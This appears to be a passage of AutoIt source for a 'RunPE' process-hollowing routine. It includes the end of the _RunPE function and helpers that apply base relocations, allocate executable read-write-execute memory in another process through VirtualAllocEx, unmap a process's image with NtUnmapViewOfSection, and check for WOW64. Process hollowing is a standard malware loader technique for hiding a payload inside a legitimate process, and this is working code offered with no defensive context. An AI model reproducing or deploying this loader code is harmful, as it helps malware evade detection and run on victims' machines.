	#region 12. CLOSE OPEN HANDLES AND RETURN PID
	DllCall("KERNEL32.DLL", "BOOL", "CloseHandle", "HANDLE", $hprocess)
	DllCall("KERNEL32.DLL", "BOOL", "CloseHandle", "HANDLE", $hthread)
	Return DllStructGetData($tprocess_information, "PROCESSID")
EndFunc   ;==>_RunPE

Func __runpe_fixreloc($pmodule, $tdata, $paddressnew, $paddressold, $fimagex64)
	Local $idelta = $paddressnew - $paddressold
	Local $isize = DllStructGetSize($tdata)
	Local $pdata = DllStructGetPtr($tdata)
	Local $timage_base_relocation, $irelativemove
	Local $ivirtualaddress, $isizeofblock, $inumberofentries
	Local $tenries, $idata, $taddress
	Local $iflag = 3 + 7 * $fimagex64
	While $irelativemove < $isize
		$timage_base_relocation = DllStructCreate("DWORD VIRTUALADDRESS; DWORD SIZEOFBLOCK", $pdata + $irelativemove)
		$ivirtualaddress = DllStructGetData($timage_base_relocation, "VIRTUALADDRESS")
		$isizeofblock = DllStructGetData($timage_base_relocation, "SIZEOFBLOCK")
		$inumberofentries = ($isizeofblock - 8) / 2
		$tenries = DllStructCreate("WORD[" & $inumberofentries & "]", DllStructGetPtr($timage_base_relocation) + 8)
		For $i = 1 To $inumberofentries
			$idata = DllStructGetData($tenries, 1, $i)
			If BitShift($idata, 12) = $iflag Then
				$taddress = DllStructCreate("PTR", $pmodule + $ivirtualaddress + BitAND($idata, 4095))
				DllStructSetData($taddress, 1, DllStructGetData($taddress, 1) + $idelta)
			EndIf
		Next
		$irelativemove += $isizeofblock
	WEnd
	Return 1
EndFunc   ;==>__runpe_fixreloc

Func __runpe_allocateexespaceataddress($hprocess, $paddress, $isize)
	Local $acall = DllCall("KERNEL32.DLL", "PTR", "VirtualAllocEx", "HANDLE", $hprocess, "PTR", $paddress, "DWORD_PTR", $isize, "DWORD", 4096, "DWORD", 64)
	If @error Or Not $acall[0] Then
		$acall = DllCall("KERNEL32.DLL", "PTR", "VirtualAllocEx", "HANDLE", $hprocess, "PTR", $paddress, "DWORD_PTR", $isize, "DWORD", 12288, "DWORD", 64)
		If @error Or Not $acall[0] Then Return SetError(1, 0, 0)
	EndIf
	Return $acall[0]
EndFunc   ;==>__runpe_allocateexespaceataddress

Func __runpe_allocateexespace($hprocess, $isize)
	Local $acall = DllCall("KERNEL32.DLL", "PTR", "VirtualAllocEx", "HANDLE", $hprocess, "PTR", 0, "DWORD_PTR", $isize, "DWORD", 12288, "DWORD", 64)
	If @error Or Not $acall[0] Then Return SetError(1, 0, 0)
	Return $acall[0]
EndFunc   ;==>__runpe_allocateexespace

Func __runpe_unmapviewofsection($hprocess, $paddress)
	DllCall("NTDLL.DLL", "INT", "NtUnmapViewOfSection", "PTR", $hprocess, "PTR", $paddress)
	If @error Then Return SetError(1, 0, 0)
	Return 1
EndFunc   ;==>__runpe_unmapviewofsection

Func __runpe_iswow64process($hprocess)
	Local $acall = DllCall("KERNEL32.DLL", "BOOL", "IsWow64Process", "HANDLE", $hprocess, "BOOL*", 0)
	If @error Or Not $acall[0] Then Return SetError(1, 0, 0)
	Return $acall[2]
EndFunc   ;==>__runpe_iswow64process